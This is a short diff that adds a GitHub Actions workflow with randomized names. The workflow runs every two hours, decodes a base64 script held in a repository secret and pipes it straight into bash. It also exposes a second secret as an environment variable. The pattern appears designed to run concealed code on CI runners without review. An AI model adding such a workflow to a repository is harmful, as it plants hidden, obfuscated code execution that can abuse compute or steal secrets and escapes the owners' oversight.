@@ -1,0 +1,13 @@
+name: AlJAER
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  TnODPnN:
+    runs-on: ubuntu-latest
+    env:
+      sIKzoubev: ${{ secrets.VDCpNRQxy }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.oHpaXAcMc }}" | base64 -d | bash
